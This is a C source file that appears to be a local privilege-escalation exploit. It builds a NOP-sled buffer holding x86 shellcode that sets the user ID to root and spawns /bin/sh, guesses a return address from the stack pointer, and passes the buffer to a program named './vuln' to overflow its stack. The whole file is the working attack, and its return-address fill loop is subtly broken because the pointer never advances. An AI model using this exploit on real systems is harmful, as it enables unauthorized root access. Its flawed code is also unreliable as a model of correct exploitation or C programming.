#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

unsigned long sp(void) {
	__asm__("mov %esp, %eax");
}

int main(int argc, char *argv[])
{
	
	int i, offset;
	long esp, ret, *addr_ptr;
	char *buffer, *ptr;

	offset = 0;
	esp = sp();
	ret = esp - offset;
	
	printf("Stack poiter(ESP) : 0x%x\n", esp);
	printf("   offset from ESP: 0x%x\n", offset);
	printf("Desired return addr: 0x%x\n", ret);

	buffer =(char *)malloc(600);

	ptr = buffer;
	addr_ptr = (long *)ptr;
	for (int i = 0; i < 600; ++i) {
		*(addr_ptr) = ret;
	}

	for (int i = 0; i < 200; ++i) {
		buffer[i] = '\x90';
	}

	ptr = buffer + 200;
	for (int i = 0; i < strlen(shellcode); ++i) {
		*(ptr++) = shellcode[i];
	}

	buffer[600 -1] = 0;
	execl("./vuln", "vuln", buffer, 0);
	
	free(buffer);
	
	return 0;
}
